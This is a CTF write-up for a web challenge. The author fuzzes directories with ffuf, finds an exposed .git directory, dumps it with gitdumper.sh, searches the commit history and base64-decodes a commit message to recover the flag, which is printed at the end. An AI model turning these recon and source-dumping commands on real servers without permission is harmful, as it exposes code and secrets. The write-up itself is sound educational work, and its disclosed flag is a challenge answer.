---
title: "🗂️ Commit and Order"
date: 2025-04-27 14:30:00 +02:00
categories: [Writeup, "CIT@CTF"]
tags: [CIT@CTF, security, web]
---
# Writeup - CIT CTF Challenge: Commit & Order: Version Control Unit

## 📋 Challenge Information
- **Name**: Commit & Order: Version Control Unit
- **Category**: Web
- **Description**: "In software development, the repository is represented by two separate yet equally important branches..."

---

## 🛠️ Solution

The task description tipped me off that this would be a Git-related task.

The first thing I did was to enumerate the site's directories using `ffuf`.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://23.179.17.40:58002/FUZZ
```
Indeed, there was a .git directory available

```plaintext


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://23.179.17.40:58002/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git/logs/              [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 1673ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2671ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 2674ms]
.git                    [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 4680ms]
.git/config             [Status: 200, Size: 155, Words: 13, Lines: 9, Duration: 4681ms]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4685ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4685ms]
.git/index              [Status: 200, Size: 209, Words: 3, Lines: 2, Duration: 4686ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 132ms]
index.php               [Status: 200, Size: 2467, Words: 915, Lines: 103, Duration: 132ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 132ms]
:: Progress: [4744/4744] :: Job [1/1] :: 302 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```

To further analyze this repository, I used the GitTools (https://github.com/internetwache/GitTools). I dumped everything using `gitdumper.sh`

```bash
./gitdumper.sh http://23.179.17.40:58002/.git/ git
```

I checked all the commits that took place and their contents to find the flag there. In order to do that, I used the following command, which only cut out the ID of the given commit and passed it to `git show` command

```bash
sudo git log | grep commit | cut -d " " -f2 | xargs sudo git show
```
In one of the commits there was this message:

```plaintext
This admin panel is under construction. No actual functionality is available yet. But here, have this: Q0lUezVkODFmNzc0M2Y0YmMyYWJ9
```
After decoding this (`Q0lUezVkODFmNzc0M2Y0YmMyYWJ9`) with base64, I obtained the flag.

---

## 🎴 Flag

```plaintext
CIT{5d81f7743f4bc2ab}
```
---

